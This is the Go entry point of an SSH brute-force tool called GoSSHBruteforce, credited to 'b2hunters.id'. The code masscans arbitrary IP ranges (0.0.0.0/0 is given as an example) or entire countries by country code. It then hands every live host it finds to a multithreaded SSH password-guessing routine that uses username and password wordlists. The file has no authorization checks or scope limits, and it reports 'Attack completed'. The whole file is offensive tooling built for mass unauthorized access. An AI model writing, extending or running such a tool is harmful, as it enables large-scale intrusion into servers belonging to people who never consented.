package main

import (
    "bufio"
    "flag"
    "fmt"
    "os"
    "strings"

    "github.com/GhostlyrootB2H/GoSSHBruteforce/internal/bruteforce"
    "github.com/GhostlyrootB2H/GoSSHBruteforce/internal/models"
    "github.com/GhostlyrootB2H/GoSSHBruteforce/internal/scanner"
    "github.com/fatih/color"
)

var banner = color.CyanString(`
╔══════════════════════════════════════════════════════════╗
║     ██████╗ ███████╗███████╗██╗  ██╗                   ║
║    ██╔════╝ ██╔════╝██╔════╝██║  ██║                   ║
║    ██║  ███╗███████╗███████╗███████║                   ║
║    ██║   ██║╚════██║╚════██║██╔══██║                   ║
║    ╚██████╔╝███████║███████║██║  ██║                   ║
║     ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝                   ║
║                    SSH BRUTEFORCE v1.0                 ║
║                    Author: b2hunters.id                ║
╚══════════════════════════════════════════════════════════╝
`)

func main() {
    // Command line flags
    scanRange := flag.String("range", "", "IP range to scan (e.g., 0.0.0.0/0, 103.0.0.0/8)")
    country := flag.String("country", "", "Scan by country code (id, ru, cn, us, etc.)")
    hostFile := flag.String("L", "", "File containing list of targets (IP:port or IP)")
    
    userFile := flag.String("U", "data/usernames.txt", "Username list file")
    passFile := flag.String("P", "data/passwords.txt", "Password list file")
    threads := flag.Int("t", 20, "Number of threads")
    rate := flag.Int("rate", 10000, "Masscan rate (packets/sec)")
    
    outputDir := flag.String("output", "results", "Output directory")
    noScan := flag.Bool("no-scan", false, "Skip scanning, use existing target file")
    
    flag.Parse()

    // Clear screen and show banner
    fmt.Print("\033[H\033[2J")
    fmt.Println(banner)

    // Create output directory
    os.MkdirAll(*outputDir, 0755)

    var targets []models.Target
    var err error

    // STEP 1: SCANNING PHASE
    if !*noScan {
        scanner := scanner.NewScanner(*outputDir)
        
        // Check masscan
        if err := scanner.CheckMasscan(); err != nil {
            color.Red("[!] %v", err)
            color.Yellow("[*] Installing masscan...")
            // Could auto-install here
            return
        }

        // Determine scan target
        if *country != "" {
            color.Cyan("[*] Scanning country: %s", *country)
            targets, err = scanner.ScanByCountry(*country, *rate)
            if err != nil {
                color.Red("[!] %v", err)
                return
            }
        } else if *scanRange != "" {
            color.Cyan("[*] Scanning range: %s", *scanRange)
            targets, err = scanner.ScanRange(*scanRange, *rate, true)
            if err != nil {
                color.Red("[!] %v", err)
                return
            }
        } else {
            color.Red("[!] Either -range or -country must be specified")
            flag.Usage()
            return
        }

        if len(targets) == 0 {
            color.Red("[!] No live hosts found")
            return
        }
    }

    // STEP 2: LOAD TARGETS FROM FILE (if --no-scan)
    if *noScan && *hostFile != "" {
        targets, err = loadTargetsFromFile(*hostFile)
        if err != nil {
            color.Red("[!] Failed to load targets: %v", err)
            return
        }
        color.Green("[✓] Loaded %d targets from %s", len(targets), *hostFile)
    }

    // STEP 3: LOAD WORDLISTS
    usernames, err := loadWordlist(*userFile)
    if err != nil {
        color.Red("[!] Failed to load usernames: %v", err)
        return
    }

    passwords, err := loadWordlist(*passFile)
    if err != nil {
        color.Red("[!] Failed to load passwords: %v", err)
        return
    }

    color.Green("[✓] Loaded %d usernames", len(usernames))
    color.Green("[✓] Loaded %d passwords", len(passwords))

    // STEP 4: START BRUTEFORCE
    bf := bruteforce.NewSSHBruteforcer(targets, usernames, passwords, *threads)
    bf.Run()

    // Show summary
    color.Cyan("\n[*] Attack completed. Check results in: %s", *outputDir)
}

func loadTargetsFromFile(filename string) ([]models.Target, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var targets []models.Target
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }

        target, err := models.ParseTarget(line)
        if err != nil {
            color.Yellow("[!] Skipping invalid target: %s (%v)", line, err)
            continue
        }
        targets = append(targets, *target)
    }

    return targets, scanner.Err()
}

func loadWordlist(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var words []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        word := strings.TrimSpace(scanner.Text())
        if word != "" && !strings.HasPrefix(word, "#") {
            words = append(words, word)
        }
    }

    return words, scanner.Err()
}
